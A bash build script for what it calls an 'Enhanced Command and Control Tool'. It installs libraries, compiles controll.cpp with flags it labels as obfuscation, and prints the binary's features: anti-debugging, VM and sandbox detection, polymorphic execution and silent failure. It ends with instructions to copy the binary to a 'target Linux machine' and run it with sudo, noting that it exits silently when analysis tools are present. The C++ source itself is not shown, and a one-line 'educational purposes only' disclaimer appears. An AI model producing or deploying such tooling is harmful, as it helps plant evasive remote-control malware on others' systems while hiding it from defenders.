#!/bin/bash

# Enhanced Command and Control Tool - Linux Compilation Script
# This script compiles the enhanced controll.cpp with advanced anti-reverse engineering features
# Designed for Linux deployment (Ubuntu, CentOS, Debian, etc.)

echo "üîß Compiling Enhanced Command and Control Tool for Linux..."
echo "=========================================================="

# Check if we're on Linux
if [[ "$OSTYPE" != "linux-gnu"* ]]; then
    echo "‚ö†Ô∏è  Warning: This script is designed for Linux systems"
    echo "   Current OS: $OSTYPE"
    echo "   The binary will be compiled for Linux deployment"
    echo ""
fi

# Check if required libraries are available
echo "üìã Checking dependencies..."

# Check for jsoncpp
if ! pkg-config --exists jsoncpp; then
    echo "‚ùå jsoncpp not found. Installing..."
    if command -v apt-get &> /dev/null; then
        sudo apt-get update && sudo apt-get install -y libjsoncpp-dev
    elif command -v yum &> /dev/null; then
        sudo yum install -y jsoncpp-devel
    elif command -v dnf &> /dev/null; then
        sudo dnf install -y jsoncpp-devel
    elif command -v pacman &> /dev/null; then
        sudo pacman -S jsoncpp
    else
        echo "‚ùå Package manager not found. Please install jsoncpp manually:"
        echo "   Ubuntu/Debian: sudo apt-get install libjsoncpp-dev"
        echo "   CentOS/RHEL: sudo yum install jsoncpp-devel"
        echo "   Arch: sudo pacman -S jsoncpp"
        exit 1
    fi
fi

# Check for libcurl
if ! pkg-config --exists libcurl; then
    echo "‚ùå libcurl not found. Installing..."
    if command -v apt-get &> /dev/null; then
        sudo apt-get install -y libcurl4-openssl-dev
    elif command -v yum &> /dev/null; then
        sudo yum install -y libcurl-devel
    elif command -v dnf &> /dev/null; then
        sudo dnf install -y libcurl-devel
    elif command -v pacman &> /dev/null; then
        sudo pacman -S curl
    else
        echo "‚ùå Package manager not found. Please install libcurl manually:"
        echo "   Ubuntu/Debian: sudo apt-get install libcurl4-openssl-dev"
        echo "   CentOS/RHEL: sudo yum install libcurl-devel"
        echo "   Arch: sudo pacman -S curl"
        exit 1
    fi
fi

# Check for OpenSSL
if ! pkg-config --exists openssl; then
    echo "‚ùå OpenSSL not found. Installing..."
    if command -v apt-get &> /dev/null; then
        sudo apt-get install -y libssl-dev
    elif command -v yum &> /dev/null; then
        sudo yum install -y openssl-devel
    elif command -v dnf &> /dev/null; then
        sudo dnf install -y openssl-devel
    elif command -v pacman &> /dev/null; then
        sudo pacman -S openssl
    else
        echo "‚ùå Package manager not found. Please install OpenSSL manually:"
        echo "   Ubuntu/Debian: sudo apt-get install libssl-dev"
        echo "   CentOS/RHEL: sudo yum install openssl-devel"
        echo "   Arch: sudo pacman -S openssl"
        exit 1
    fi
fi

echo "‚úÖ Dependencies checked!"

# Compilation flags for maximum security and obfuscation
echo "üîí Setting compilation flags for maximum security..."

CXX_FLAGS="-std=c++17 -O3 -DNDEBUG -fvisibility=hidden -fvisibility-inlines-hidden"
SECURITY_FLAGS="-fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -pie"
OBFUSCATION_FLAGS="-fno-rtti -fno-exceptions -fno-unwind-tables -fno-asynchronous-unwind-tables"
LINKER_FLAGS="-Wl,-z,relro,-z,now -Wl,--strip-all -Wl,--gc-sections"

echo "üì¶ Compiling with enhanced security features..."

# Compile the enhanced version
g++ $CXX_FLAGS $SECURITY_FLAGS $OBFUSCATION_FLAGS \
    -o CommandandControll_Enhanced \
    controll.cpp \
    -ljsoncpp -lcurl -lssl -lcrypto \
    $LINKER_FLAGS

if [ $? -eq 0 ]; then
    echo "‚úÖ Compilation successful!"
    echo "üîí Binary: CommandandControll_Enhanced"
    
    # Show binary information
    echo ""
    echo "üìä Binary Analysis:"
    echo "==================="
    file CommandandControll_Enhanced
    echo ""
    echo "üìè Size: $(ls -lh CommandandControll_Enhanced | awk '{print $5}')"
    echo ""
    echo "üîç Security Features:"
    echo "====================="
    echo "‚Ä¢ Anti-debugging with ptrace detection"
    echo "‚Ä¢ VM/sandbox detection"
    echo "‚Ä¢ Timing-based analysis detection"
    echo "‚Ä¢ Memory usage monitoring"
    echo "‚Ä¢ Process monitoring detection"
    echo "‚Ä¢ String obfuscation"
    echo "‚Ä¢ Polymorphic code execution"
    echo "‚Ä¢ Advanced signal handling"
    echo "‚Ä¢ Silent failure modes"
    echo "‚Ä¢ Code stripping and obfuscation"
    echo "‚Ä¢ Position Independent Executable (PIE)"
    echo "‚Ä¢ Stack canaries"
    echo "‚Ä¢ Read-only relocations"
    
    # Test if binary is executable
    if [ -x CommandandControll_Enhanced ]; then
        echo ""
        echo "‚úÖ Binary is executable and ready for deployment!"
        echo "‚ö†Ô∏è  Remember: This tool is for educational purposes only!"
        
        # Show deployment instructions
        echo ""
        echo "üöÄ Deployment Instructions:"
        echo "==========================="
        echo "1. Copy CommandandControll_Enhanced to target Linux machine"
        echo "2. Ensure target has required libraries (libjsoncpp, libcurl, libssl)"
        echo "3. Run with: sudo ./CommandandControll_Enhanced"
        echo "4. Binary will automatically detect analysis tools and exit silently"
        
    else
        echo "‚ùå Binary is not executable. Setting permissions..."
        chmod +x CommandandControll_Enhanced
        echo "‚úÖ Permissions set!"
    fi
    
else
    echo "‚ùå Compilation failed!"
    echo "üîç Check the error messages above for details."
    echo ""
    echo "üí° Troubleshooting Tips:"
    echo "‚Ä¢ Ensure all dependencies are installed"
    echo "‚Ä¢ Check GCC version (requires 7.0+)"
    echo "‚Ä¢ Verify file permissions"
    echo "‚Ä¢ Check available disk space"
    exit 1
fi

echo ""
echo "üéØ Enhanced Command and Control Tool ready for Linux deployment!"
echo "================================================================"
